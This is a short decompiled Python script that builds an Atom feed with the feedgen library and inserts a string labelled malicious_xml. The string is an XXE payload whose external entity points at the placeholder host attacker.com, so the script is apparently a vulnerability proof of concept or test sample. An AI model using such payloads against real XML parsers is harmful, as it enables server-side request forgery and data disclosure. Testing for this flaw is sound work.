# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 238_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 922 bytes
from feedgen.feed import FeedGenerator

def create_rss_feed(xml_content):
    fg = FeedGenerator()
    fg.id("http://example.com/feed")
    fg.title("Example Feed")
    fg.link(href="http://example.com", rel="self")
    fg.description("This is an example feed.")
    fg.add_entry().title("Example Entry").content(xml_content, type="html")
    return fg.atom_str(pretty=True)


malicious_xml = '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "http://attacker.com/malicious">\n]>\n<feed>\n  <entry>\n    <title>Example Entry</title>\n    <content>&xxe;</content>\n  </entry>\n</feed>\n'
try:
    rss_feed = create_rss_feed(malicious_xml)
    print(rss_feed)
except Exception as e:
    try:
        print(f"An error occurred: {e}")
    finally:
        e = None
        del e

# okay decompiling 238_1.pyc
